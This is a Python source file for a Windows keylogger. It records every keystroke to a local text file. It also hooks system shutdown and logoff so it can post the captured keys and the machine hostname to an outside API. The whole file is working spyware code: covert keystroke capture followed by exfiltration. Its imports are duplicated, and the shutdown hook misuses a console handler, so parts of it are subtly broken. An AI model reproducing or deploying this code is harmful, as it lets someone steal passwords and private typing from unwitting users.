# Here we have to build the Python KeyLogger.
# Using pyInput  : For Key Logginh.
# Using requests : For Sending request to an API.
# Using pywin32 : To track the user windows OS state.

from pynput.keyboard import Listener
import socket
from apiCall import postRequest

file = "keyLogger.txt"

# Keylogging function
import win32api
import win32con
import socket
from apiCall import postRequest
from pynput.keyboard import Listener

file = "keyLogger.txt"

def onPressKey(key):
    try:
        with open(file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(file, "a") as f:
            f.write(f'[{key}]')


# Function created to send data to the API.
def sendDataToAPI():
    lines = ""
    with open(file, 'r') as f:
        lines = f.readlines()

    desktopId = socket.gethostname()

    # API call
    postRequest(desktopId, lines)
    return True

# This function will be called before the system shuts down.
# Even when the user tries to logoff, then also before the user logs off, this will try to send the data to the API.
def onShutdown():
    print("System is shutting down... Sending data to API.")
    sendDataToAPI()

# This function hooks into system shutdown events.
def shutdownHook():
    def handler(event):
        if event == win32con.WM_QUERYENDSESSION:
            onShutdown()
            return True
        return False

    win32api.SetConsoleCtrlHandler(handler, True)

if __name__ == "__main__":
    shutdownHook()

    # Start keylogger listener
    with Listener(on_press=onPressKey) as listener:
        listener.join()
